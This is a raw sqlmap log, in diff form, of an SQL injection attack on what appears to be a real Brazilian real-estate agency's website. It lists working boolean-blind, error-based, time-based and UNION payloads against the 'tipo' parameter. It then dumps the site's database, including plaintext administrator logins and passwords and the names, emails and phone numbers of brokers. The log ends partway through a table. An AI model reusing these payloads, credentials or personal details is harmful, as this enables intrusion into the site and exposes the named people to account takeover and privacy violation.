@@ -1,0 +1,543 @@
+sqlmap identified the following injection point(s) with a total of 106 HTTP(s) requests:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: :=busca&tt=atd&negocio=1&tipo=(SELECT (CASE WHEN (1651=1651) THEN 11 ELSE (SELECT 1530 UNION SELECT 1372) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR (SELECT 4953 FROM(SELECT COUNT(*),CONCAT(0x717a6a6271,(SELECT (ELT(4953=4953,1))),0x716b7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a6271,0x49544c6568446c7445414448516450514f704941474a477971526d6453696c69487441557758617a,0x716b7a7871),NULL,NULL-- rhnz
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, Nginx
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] imobalia_site
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: :=busca&tt=atd&negocio=1&tipo=(SELECT (CASE WHEN (1651=1651) THEN 11 ELSE (SELECT 1530 UNION SELECT 1372) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR (SELECT 4953 FROM(SELECT COUNT(*),CONCAT(0x717a6a6271,(SELECT (ELT(4953=4953,1))),0x716b7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a6271,0x49544c6568446c7445414448516450514f704941474a477971526d6453696c69487441557758617a,0x716b7a7871),NULL,NULL-- rhnz
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: imobalia_site
+[22 tables]
++-------------------+
+| adm_campos        |
+| adm_galeria       |
+| adm_galeria_capa  |
+| adm_galeria_nomes |
+| adm_logins        |
+| adm_secao         |
+| adm_tipos_campos  |
+| atendentes        |
+| banners           |
+| cadastro          |
+| cidades           |
+| contato           |
+| corretores        |
+| empresa           |
+| imoveis           |
+| imoveis_bairros   |
+| imoveis_cidades   |
+| imoveis_negocio   |
+| imoveis_status    |
+| imoveis_tipo      |
+| noticias          |
+| usuarios          |
++-------------------+
+
+Database: imobalia_site
++-------------------+---------+
+| Table             | Entries |
++-------------------+---------+
+| imoveis_bairros   | 76      |
+| adm_campos        | 45      |
+| imoveis           | 15      |
+| adm_secao         | 12      |
+| imoveis_tipo      | 11      |
+| adm_tipos_campos  | 9       |
+| imoveis_cidades   | 7       |
+| usuarios          | 7       |
+| adm_logins        | 5       |
+| adm_galeria_capa  | 3       |
+| banners           | 3       |
+| corretores        | 3       |
+| imoveis_status    | 3       |
+| adm_galeria_nomes | 2       |
+| imoveis_negocio   | 2       |
+| adm_galeria       | 1       |
+| cadastro          | 1       |
+| contato           | 1       |
+| empresa           | 1       |
+| noticias          | 1       |
++-------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tipo (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: :=busca&tt=atd&negocio=1&tipo=(SELECT (CASE WHEN (1651=1651) THEN 11 ELSE (SELECT 1530 UNION SELECT 1372) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR (SELECT 4953 FROM(SELECT COUNT(*),CONCAT(0x717a6a6271,(SELECT (ELT(4953=4953,1))),0x716b7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: :=busca&tt=atd&negocio=1&tipo=11 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6a6271,0x49544c6568446c7445414448516450514f704941474a477971526d6453696c69487441557758617a,0x716b7a7871),NULL,NULL-- rhnz
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: imobalia_site
+[22 tables]
++-------------------+
+| adm_campos        |
+| adm_galeria       |
+| adm_galeria_capa  |
+| adm_galeria_nomes |
+| adm_logins        |
+| adm_secao         |
+| adm_tipos_campos  |
+| atendentes        |
+| banners           |
+| cadastro          |
+| cidades           |
+| contato           |
+| corretores        |
+| empresa           |
+| imoveis           |
+| imoveis_bairros   |
+| imoveis_cidades   |
+| imoveis_negocio   |
+| imoveis_status    |
+| imoveis_tipo      |
+| noticias          |
+| usuarios          |
++-------------------+
+
+Database: imobalia_site
+Table: adm_campos
+[45 entries]
++-------------+-----+------+-------------+-------+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------+--------+---------+
+| apelido     | tam | tipo | nome        | ordem | secao | ajuda                                                                                                                                                       | valor                                                                     | codigo | tam_max |
++-------------+-----+------+-------------+-------+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------+--------+---------+
+| <blank>     | 0   | 1    | codigo      | 1     | 15    | <blank>                                                                                                                                                     | <blank>                                                                   | 115    | 11      |
+| <blank>     | 0   | 1    | codigo      | 1     | 15    | <blank>                                                                                                                                                     | <blank>                                                                   | 115    | 11      |
+| Acesso      | 0   | 8    | acesso      | 4     | 14    | <blank>                                                                                                                                                     | adm_secao:codigo:nome                                                     | 114    | 0       |
+| Bairro      | 50  | 2    | bairro      | 3     | 24    | <blank>                                                                                                                                                     | <blank>                                                                   | 143    | 50      |
+| Bairro      | 50  | 2    | bairro      | 3     | 24    | <blank>                                                                                                                                                     | cidade:imoveis_bairros:cidade:bairro:Selecione a cidade                   | 143    | 50      |
+| Cidade      | 0   | 7    | cidade      | 2     | 24    | <blank>                                                                                                                                                     | <blank>                                                                   | 142    | 11      |
+| Cidade      | 0   | 12   | cidade      | 5     | 25    | <blank>                                                                                                                                                     | imoveis_cidades:codigo:cidade                                             | 147    | 11      |
+| Cidade      | 50  | 2    | cidade      | 2     | 23    | <blank>                                                                                                                                                     | imoveis_cidades:codigo:cidade:imoveis_bairros:cidade:bairro:bairro:bairro | 140    | 50      |
+| Código      | 0   | 1    | codigo      | 1     | 16    | <blank>                                                                                                                                                     | <blank>                                                                   | 117    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 23    | <blank>                                                                                                                                                     | <blank>                                                                   | 139    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 23    | <blank>                                                                                                                                                     | <blank>                                                                   | 139    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 123    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 123    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 123    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 23    | <blank>                                                                                                                                                     | <blank>                                                                   | 139    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 23    | <blank>                                                                                                                                                     | <blank>                                                                   | 139    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 24    | <blank>                                                                                                                                                     | <blank>                                                                   | 141    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 24    | <blank>                                                                                                                                                     | <blank>                                                                   | 141    | 11      |
+| Código      | 0   | 1    | codigo      | 1     | 27    | <blank>                                                                                                                                                     | <blank>                                                                   | 158    | 11      |
+| Data        | 0   | 4    | data        | 2     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 124    | 10      |
+| Email       | 50  | 2    | email       | 4     | 19    | <blank>                                                                                                                                                     | <blank>                                                                   | 131    | 50      |
+| Endereço    | 50  | 2    | endereco    | 4     | 25    | <blank>                                                                                                                                                     | <blank>                                                                   | 148    | 50      |
+| Imagem      | 50  | 9    | imagem      | 4     | 16    | 705 x 295px                                                                                                                                                 | <blank>                                                                   | 120    | 250     |
+| Informações | 50  | 2    | informacoes | 8     | 25    | <blank>                                                                                                                                                     | <blank>                                                                   | 151    | 100     |
+| Link        | 50  | 2    | link        | 4     | 18    | http://www.exemplo.com.br                                                                                                                                   | <blank>                                                                   | 126    | 250     |
+| Link        | 50  | 2    | link        | 3     | 16    | http://www.exemplo.com.br                                                                                                                                   | <blank>                                                                   | 119    | 250     |
+| Negócio     | 0   | 7    | negocio     | 3     | 25    | <blank>                                                                                                                                                     | imoveis_negocio:codigo:negocio                                            | 146    | 11      |
+| Nome        | 50  | 2    | nome        | 2     | 26    | <blank>                                                                                                                                                     | <blank>                                                                   | 155    | 50      |
+| Nome        | 15  | 2    | nome        | 2     | 14    | <blank>                                                                                                                                                     | <blank>                                                                   | 112    | 15      |
+| Nome        | 50  | 2    | nome        | 2     | 20    | \n\nTutorial MSN online.\n<a href="http://www.imobiliariaaliancatupa.com.br/anexos/msn_online.doc" target="_blank" style="color:blue;">[ Download ]</a>\n\n | <blank>                                                                   | 133    | 50      |
+| Nome        | 50  | 2    | nome        | 2     | 19    | <blank>                                                                                                                                                     | <blank>                                                                   | 129    | 50      |
+| Restrito    | 3   | 2    | restrito    | 9     | 25    | <blank>                                                                                                                                                     | não;sim                                                                   | 152    | 3       |
+| Senha       | 20  | 6    | senha       | 4     | 26    | <blank>                                                                                                                                                     | <blank>                                                                   | 157    | 20      |
+| Senha       | 10  | 6    | senha       | 3     | 14    | <blank>                                                                                                                                                     | <blank>                                                                   | 113    | 10      |
+| Status      | 0   | 7    | status      | 10    | 25    | <blank>                                                                                                                                                     | imoveis_status:codigo:titulo                                              | 153    | 0       |
+| Telefone    | 50  | 2    | telefone    | 3     | 19    | <blank>                                                                                                                                                     | <blank>                                                                   | 130    | 50      |
+| Texto       | 0   | 3    | texto       | 3     | 20    | <blank>                                                                                                                                                     | <blank>                                                                   | 134    | 65535   |
+| Texto       | 0   | 3    | texto       | 5     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 127    | 65535   |
+| Texto       | 0   | 3    | texto       | 2     | 17    | <blank>                                                                                                                                                     | <blank>                                                                   | 122    | 65535   |
+| Texto       | 0   | 3    | texto       | 2     | 27    | <blank>                                                                                                                                                     | <blank>                                                                   | 159    | 65535   |
+| Tipo        | 0   | 7    | tipo        | 2     | 25    | <blank>                                                                                                                                                     | imoveis_tipo:codigo:tipo                                                  | 145    | 11      |
+| Título      | 50  | 2    | titulo      | 3     | 18    | <blank>                                                                                                                                                     | <blank>                                                                   | 125    | 100     |
+| Título      | 50  | 2    | titulo      | 2     | 16    | <blank>                                                                                                                                                     | <blank>                                                                   | 118    | 50      |
+| Usuário     | 30  | 2    | usuario     | 3     | 26    | <blank>                                                                                                                                                     | <blank>                                                                   | 156    | 30      |
+| Valor       | 0   | 5    | valor       | 7     | 25    | <blank>                                                                                                                                                     | <blank>                                                                   | 150    | 11      |
++-------------+-----+------+-------------+-------+-------+-------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------------------------------------------------------------+--------+---------+
+
+Database: imobalia_site
+Table: adm_galeria
+[1 entry]
++----------+--------+----------+----------+-----------+-----------+--------------+---------------+---------------+-----------------+
+| modelo   | codigo | altura_p | altura_g | largura_p | largura_g | maximo_fotos | campo_ligacao | pasta_inicial | tab_relacionada |
++----------+--------+----------+----------+-----------+-----------+--------------+---------------+---------------+-----------------+
+| lightbox | 3      | 93       | 450      | 125       | 600       | 0            | codigo        | imoveis       | imoveis         |
++----------+--------+----------+----------+-----------+-----------+--------------+---------------+---------------+-----------------+
+
+Database: imobalia_site
+Table: adm_galeria_capa
+[3 entries]
++---------+--------+--------------------------------+---------+----------+
+| pasta   | codigo | imagem                         | galeria | galeria2 |
++---------+--------+--------------------------------+---------+----------+
+| imoveis | 1      | 23_03_2012_05_32_21_800x600    | 10      | 3        |
+| imoveis | 2      | 30_03_2012_09_47_08_big-ben    | 6       | 3        |
+| imoveis | 3      | 19_04_2012_03_16_09_imagem_003 | 41      | 3        |
++---------+--------+--------------------------------+---------+----------+
+
+Database: imobalia_site
+Table: adm_galeria_nomes
+[2 entries]
++--------+-------------------------------+---------------+---------+----------+
+| codigo | imagem                        | titulo        | galeria | galeria2 |
++--------+-------------------------------+---------------+---------+----------+
+| 1      | 30_03_2012_09_47_08_big-ben   | The Big Ben   | 3       | 6        |
+| 2      | 23_03_2012_05_32_21_600x450_3 | Flor de Lótus | 3       | 6        |
++--------+-------------------------------+---------------+---------+----------+
+
+Database: imobalia_site
+Table: adm_logins
+[5 entries]
++---------+----------+--------+----------------------------------------------------------------------------------------------------+
+| nome    | senha    | codigo | acesso                                                                                             |
++---------+----------+--------+----------------------------------------------------------------------------------------------------+
+| grs     | ag5599tb | 1      | 5,2,3,1,4,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 |
+| dani    | 850223   | 11     | ,20,16,27,17,19,15,25,24,23,18,26,                                                                 |
+| isabela | 595534   | 12     | ,20,16,27,17,19,15,25,24,23,18,,                                                                   |
+| valter  | 708090   | 14     | ,20,,,,,,25,24,23,18,,                                                                             |
+| Dayele  | 531434   | 16     | ,,,,,,,25,24,23,18,,                                                                               |
++---------+----------+--------+----------------------------------------------------------------------------------------------------+
+
+Database: imobalia_site
+Table: adm_secao
+[12 entries]
++-------------------+---------+-----------------+--------+--------------------------------------+----------+
+| nome              | ajuda   | tabela          | codigo | operacao                             | n_campos |
++-------------------+---------+-----------------+--------+--------------------------------------+----------+
+| Adm Acesso        | <blank> | adm_logins      | 14     | listar;editar;deletar;buscar;inserir | 2        |
+| Empresa           | <blank> | empresa         | 15     | editar                               | 3        |
+| Banners           | <blank> | banners         | 16     | listar;editar;deletar;buscar;inserir | 2        |
+| Contato (texto)   | <blank> | contato         | 17     | editar                               | 3        |
+| Notícias          | <blank> | noticias        | 18     | listar;editar;deletar;buscar;inserir | 3        |
+| Corretores        | <blank> | corretores      | 19     | listar;editar;deletar;buscar;inserir | 2        |
+| Atendentes        | <blank> | atendentes      | 20     | listar;editar;deletar;buscar;inserir | 2        |
+| Imóveis - Cidades | <blank> | imoveis_cidades | 23     | listar;editar;deletar;buscar;inserir | 2        |
+| Imóveis - Bairros | <blank> | imoveis_bairros | 24     | listar;editar;deletar;buscar;inserir | 3        |
+| Imóveis           | <blank> | imoveis         | 25     | listar;editar;deletar;buscar;inserir | 5        |
+| Usuários          | <blank> | usuarios        | 26     | listar;editar;deletar;buscar;inserir | 2        |
+| Cadastro (texto)  | <blank> | cadastro        | 27     | editar                               | 3        |
++-------------------+---------+-----------------+--------+--------------------------------------+----------+
+
+Database: imobalia_site
+Table: adm_tipos_campos
+[9 entries]
++-------------------------------------------------+--------+
+| nome                                            | codigo |
++-------------------------------------------------+--------+
+| AutoNumeração                                   | 1      |
+| Texto Simples (varchar)                         | 2      |
+| Texto Longo (Text)                              | 3      |
+| Data (Date)                                     | 4      |
+| Número                                          | 5      |
+| Senha (Texto)                                   | 6      |
+| Combo Tabela (tabela:campo_chave:campo_mostrar) | 7      |
+| CheckBox (tabela:campo_chave:campo_mostrar)     | 8      |
+| Upload (tipo1;tipo2;tipo3)                      | 9      |
++-------------------------------------------------+--------+
+
+Database: imobalia_site
+Table: atendentes
+[0 entries]
++------+-------+--------+
+| nome | texto | codigo |
++------+-------+--------+
++------+-------+--------+
+
+Database: imobalia_site
+Table: banners
+[3 entries]
++---------+---------------------+--------+------------------------------------------------------------------------------------+
+| link    | titulo              | codigo | imagem                                                                             |
++---------+---------------------+--------+------------------------------------------------------------------------------------+
+| <blank> | Imobiliária Aliança | 1      | http://www.imobiliariaaliancatupa.com.br/arquivos/ba1.jpg                          |
+| <blank> | Procurando          | 7      | http://www.imobiliariaaliancatupa.com.br/arquivos/ba2.jpg                          |
+| <blank> | Fachada             | 6      | http://www.imobiliariaaliancatupa.com.br/arquivos/25_04_2012_09_31_54_dsc07436.jpg |
++---------+---------------------+--------+------------------------------------------------------------------------------------+
+
+Database: imobalia_site
+Table: cadastro
+[1 entry]
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| texto                                                                                                                                                                | codigo |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| <font face="verdana">Se você deseja se cadastrar e visualizar imóveis exclusivos preencha o formulário e envie-nos, teremos o maior prazer em contatá-lo!</font>\r\n | 1      |
++----------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+
+Database: imobalia_site
+Table: cidades
+[0 entries]
++--------+--------+--------+
+| cidade | codigo | estado |
++--------+--------+--------+
++--------+--------+--------+
+
+Database: imobalia_site
+Table: contato
+[1 entry]
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| texto                                                                                                                                                                                                                                                       | codigo |
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| <font face="verdana">Se você deseja obter maiores informações sobre nossos serviços, ou apenas conhecer um pouco mais da Imobiliária Aliança, entre em contato conosco! Preencha o formulário e envie-nos, teremos o maior prazer em contatá-lo!</font>\r\n | 1      |
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+
+Database: imobalia_site
+Table: corretores
+[3 entries]
++----------------------+-----------------------------------+--------+----------------+
+| nome                 | email                             | codigo | telefone       |
++----------------------+-----------------------------------+--------+----------------+
+| Paulo César Maran    | imobiliariaalianca@unisite.com.br | 7      | (14) 3496-5955 |
+| José Carlos Convento | imobiliariaalianca@unisite.com.br | 5      | (14) 3496-5955 |
+| Daniele Convento     | danieleconvento@hotmail.com       | 6      | (14) 3496-5955 |
++----------------------+-----------------------------------+--------+----------------+
+
+Database: imobalia_site
+Table: empresa
+[1 entry]
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| texto                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | codigo |
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+| <p align="justify" style="font-family: Verdana; text-align: justify; "></p><p align="justify">A \r\nImobiliária Aliança  iniciou no ano de 1.978, na Rua Aimorés, 1.730, com o ramo de loteamentos.</p><p align="justify">Posteriormente passou a trabalhar com corretagens (compra e venda) e administração de imóveis (locação).</p><p align="justify">Em 1.993 mudou para a Rua Guaranis, 457 (endereço atual - Sede própria).</p><p align="justify">Portanto, está no mercado há mais de 34 anos.</p><p align="justify"><img src="http://www.imobiliariaaliancatupa.com.br/arquivos/25_04_2012_09_40_13_dsc0.jpg" alt="" title="" align="none" style="margin-top: 10px; margin-right: 10px; margin-bottom: 10px; margin-left: 10px; "></p><p></p> | 1      |
++-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------+
+
+Database: imobalia_site
+Table: imoveis
+[15 entries]
++--------+------+-------+--------+--------+--------+---------+------------------------------+----------+------------------------------------------------------------------------------------------------------+
+| cidade | tipo | valor | status | bairro | codigo | negocio | endereco                     | restrito | informacoes                                                                                          |
++--------+------+-------+--------+--------+--------+---------+------------------------------+----------+------------------------------------------------------------------------------------------------------+
+| 0      | 9    | 0     | 2      | 0      | 553    | 2       | Rua Aimorés                  | não      | <blank>                                                                                              |
+| 0      | 1    | 0     | 3      | 0      | 43     | 2       | RUA SÃO PAULO                | não      | <blank>                                                                                              |
+| 0      | 1    | 0     | 1      | 0      | 38     | 2       | Rua Faustino Sanches         | não      | 03 dormitórios sendo 01 apto, sala, cozinha, banheiro, despensa, lavanderia e garagem                |
+| 0      | 1    | 0     | 1      | 0      | 38     | 2       | Rua Faustino Sanches         | não      | 03 dormitórios sendo 01 apto, sala, cozinha, banheiro, despensa, lavanderia e garagem                |
+| 0      | 1    | 0     | 2      | 0      | 463    | 2       | Rua Car                      | não      | <blank>                                                                                              |
+| 0      | 1    | 0     | 2      | 0      | 463    | 2       | Rua Car                      | não      | <blank>                                                                                              |
+| 0      | 1    | 0     | 2      | 0      | 463    | 2       | Rua Car                      | não      | <blank>                                                                                              |
+| 1      | 1    | 0     | 2      | 9      | 613    | 2       | Rua Francisco Gomes Pato, 17 | não      | 01 Domitório , Sala ,Cozinha, WC e entrada para carro.                                               |
+| 1      | 1    | 0     | 2      | 9      | 613    | 2       | Rua Francisco Gomes Pato, 17 | não      | 01 Domitório , Sala ,Cozinha, WC e entrada para carro.                                               |
+| 1      | 9    | 0     | 2      | 2      | 442    | 2       | Rua Caingangs                | não      | 1 salão, 2 wc, 2 copas,1 despensa, andar sup. 2 salões. 2 escritórios e sacada.                      |
+| 1      | 9    | 0     | 2      | 2      | 284    | 2       | Av. Tamoios                  | não      | 01 salão comercial                                                                                   |
+| 1      | 9    | 0     | 2      | 2      | 599    | 2       | Guaranis, 457                | não      | 01 sala, e 01WC                                                                                      |
+| 1      | 1    | 0     | 2      | 62     | 627    | 1       | Rua Edson Bernarde, 371      | sim      | 03dormitorios, sendo 02 suité, sala, copa,cozinha,  Wc e lavanderia coberta e Garagem.               |
+| 1      | 1    | 0     | 2      | 2      | 628    | 2       | Rua Goitacazes, 11           | não      | Andar superior 03 dormitorios sendo 01 suite e 01 Wc social, Terreo sala, copa, cozinha, e 01 dormit |
+| 1      | 9    | 0     | 2      | 2      | 629    | 2       | Rua Botocudos                | não      | 8 salas, sendo 4 suites, 2 Wcs, recepção e sala de espera.                                           |
++--------+------+-------+--------+--------+--------+---------+------------------------------+----------+------------------------------------------------------------------------------------------------------+
+
+Database: imobalia_site
+Table: imoveis_bairros
+[76 entries]
++--------+-------------------------------------+--------+
+| cidade | bairro                              | codigo |
++--------+-------------------------------------+--------+
+| 1      | Parque Universitário 3              | 1      |
+| 1      | Centro                              | 2      |
+| 1      | Vila Indústria                      | 3      |
+| 1      | Jardim Casari                       | 4      |
+| 1      | Vila Sidouro                        | 11     |
+| 1      | Parque das Nações                   | 6      |
+| 1      | Cohab Cris                          | 7      |
+| 1      | Vila Abarca                         | 8      |
+| 1      | Jardim Aritana                      | 9      |
+| 1      | Vila Inglesa                        | 10     |
+| 1      | Nova Tupã                           | 12     |
+| 1      | Tupã Mirim                          | 13     |
+| 1      | Parque Aliança                      | 14     |
+| 1      | Vila Marajoara                      | 15     |
+| 1      | Jardim Jaçanã                       | 16     |
+| 1      | Parque Kenedy                       | 17     |
+| 1      | Conj. Habitacional Cinquentenário   | 18     |
+| 1      | Vila Formosa                        | 19     |
+| 1      | Parque Universitário                | 20     |
+| 1      | Vila Santa Terezinha                | 21     |
+| 1      | Jardim Nossa Senhora de Fátima      | 22     |
+| 1      | Vila Santa Helena                   | 23     |
+| 1      | Vila Santa Inez                     | 24     |
+| 1      | Jardim Itaipu                       | 25     |
+| 1      | Jardim América                      | 26     |
+| 1      | Parque Ibirapuera                   | 27     |
+| 1      | Cj. Habitacional Ver. Antônio Caram | 28     |
+| 1      | Vila Aviação                        | 29     |
+| 1      | Parque Ipanema                      | 30     |
+| 1      | Jardim Guanabara                    | 31     |
+| 1      | Jardim Rubiacea                     | 32     |
+| 1      | Vila Independência                  | 33     |
+| 1      | Vila Santa Cecilia                  | 34     |
+| 1      | Vila Romana                         | 35     |
+| 1      | Cecap                               | 36     |
+| 1      | Vila Vitória                        | 37     |
+| 1      | Parque Ipiranga                     | 38     |
+| 1      | Vila Eldorado                       | 39     |
+| 1      | Jardim Vellini                      | 40     |
+| 1      | Vila Giovanetti                     | 41     |
+| 1      | Parque São Pedro                    | 42     |
+| 1      | Conj.Hab.J.Ribeiro Porto            | 43     |
+| 1      | Parque Dom Bosco                    | 44     |
+| 1      | Jardim Cybele                       | 45     |
+| 1      | Vila Espanha                        | 46     |
+| 1      | Jardin Sta. Adélia                  | 47     |
+| 1      | Jardim Santa Maria                  | 48     |
+| 1      | Jardim Paulista                     | 49     |
+| 7      | Centro                              | 50     |
+| 9      | Centro                              | 51     |
+| 1      | Vila Lahoz                          | 52     |
+| 1      | Parque Bela Vista                   | 53     |
+| 1      | Jardim Ideal                        | 55     |
+| 1      | Jardim Marabá                       | 56     |
+| 1      | Vila Santa Rita                     | 57     |
+| 10     | Centro                              | 58     |
+| 1      | Jardim Santa Terezinha              | 59     |
+| 1      | Jardim Unesp                        | 60     |
+| 1      | Vila Mariluz                        | 61     |
+| 1      | Conj.Hab. Antonio Pereira Gaspar    | 62     |
+| 1      | Vila Naimbri                        | 63     |
+| 1      | Vila Nova II                        | 64     |
+| 1      | Vila José Lemes                     | 65     |
+| 1      | Vila Alto Sumaré                    | 66     |
+| 11     | Centro                              | 67     |
+| 1      | Parque Maria Cristina               | 68     |
+| 1      | Vila Vargas                         | 69     |
+| 1      | Chácara - Tupã / Queiroz            | 70     |
+| 1      | Vila São José                       | 71     |
+| 1      | Conj. Hab.Severino F. da Silva      | 72     |
+| 1      | Vila São Paulo                      | 74     |
+| 1      | Parque Carajás                      | 75     |
+| 1      | Vila Servilha                       | 76     |
+| 1      | Parque Dom Pedro                    | 77     |
+| 1      | Chácara / Estrada p/Faz.Luar        | 78     |
+| 1      | Vila Teixeira                       | 79     |
++--------+-------------------------------------+--------+
+
+Database: imobalia_site
+Table: imoveis_cidades
+[7 entries]
++-------------+--------+
+| cidade      | codigo |
++-------------+--------+
+| Tupã        | 1      |
+| Quatá       | 3      |
+| Varpa       | 9      |
+| Herculandia | 7      |
+| Paulicéia   | 6      |
+| Universo    | 10     |
+| Parnaso     | 11     |
++-------------+--------+
+
+Database: imobalia_site
+Table: imoveis_negocio
+[2 entries]
++--------+---------+
+| codigo | negocio |
++--------+---------+
+| 1      | Venda   |
+| 2      | Aluguel |
++--------+---------+
+
+Database: imobalia_site
+Table: imoveis_status
+[3 entries]
++------------+--------+
+| titulo     | codigo |
++------------+--------+
+| Lançamento | 1      |
+| Destaque   | 2      |
+| Normal     | 3      |
++------------+--------+
+
+Database: imobalia_site
+Table: imoveis_tipo
+[11 entries]
++----------------+--------+
+| tipo           | codigo |
++----------------+--------+
+| Residência     | 1      |
+| Barracão       | 2      |
+| Chácara        | 3      |
+| Clínica        | 4      |
+| Fazenda        | 5      |
+| Kitnet         | 6      |
+| Loteamento     | 7      |
